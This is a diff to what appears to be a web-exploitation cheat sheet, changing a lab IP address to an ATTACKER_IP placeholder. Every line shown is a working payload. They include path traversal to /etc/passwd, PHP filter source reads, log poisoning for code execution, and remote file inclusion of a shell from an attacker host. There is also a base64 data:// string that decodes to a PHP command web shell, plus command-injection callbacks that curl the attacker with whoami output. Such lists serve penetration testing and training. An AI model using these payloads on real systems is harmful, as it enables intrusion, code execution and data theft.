@@ -23,7 +23,7 @@ references:
 ?page=....//....//etc/passwd            # filter bypass
 ?page=php://filter/convert.base64-encode/resource=index.php   # read source
 ?page=/var/log/apache2/access.log      # log poisoning -> RCE
-?page=http://10.10.14.5/shell.txt      # RFI when allow_url_include=On
+?page=http://ATTACKER_IP/shell.txt      # RFI when allow_url_include=On
 ?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+
 ```
 
@@ -45,7 +45,7 @@ shell.php%00.png / shell.php.png / shell.pHp                  # null byte / doub
 ; id          | id          `id`          $(id)
 %0a id        && id         || id
 # Blind: force a delay or call back to you
-; ping -c 3 10.10.14.5      ; curl 10.10.14.5/`whoami`
+; ping -c 3 ATTACKER_IP      ; curl ATTACKER_IP/`whoami`
 ```
 
 ## Server-side template injection (SSTI)
